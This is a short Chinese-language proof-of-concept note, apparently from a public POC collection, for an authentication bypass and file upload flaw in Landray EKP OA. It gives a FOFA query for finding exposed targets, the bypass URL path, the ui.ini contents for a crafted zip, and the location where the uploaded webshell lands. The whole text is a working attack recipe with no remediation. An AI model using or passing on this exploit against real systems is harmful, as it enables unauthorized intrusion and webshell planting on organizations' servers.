
## 蓝凌EKP前台授权绕过导致文件上传


## fofa
```
app="Landray-OA系统"
```

访问路径/api///sys/ui/sys_ui_extend/sysUiExtend.do?method=upload其中路径需要api后面需要///不能变。

## poc
```
/api///sys/ui/sys_ui_extend/sysUiExtend.do?method=upload

```
![image](https://github.com/wy876/POC/assets/139549762/47bd374a-d072-46ab-824e-e23ef8d08a69)


## 文件上传
然后上传zip包需要有ui.ini文件内容如下
```
id=ZzzZname=testthumb=test

```
![image](https://github.com/wy876/POC/assets/139549762/1d6615f9-a98b-4747-a6a8-9e6bdd3218c0)

![image](https://github.com/wy876/POC/assets/139549762/1cb1a160-309f-44bb-b0d3-03e59b163258)

马会在/resource/ui-ext/ZzzZ/jmdyy.jsp
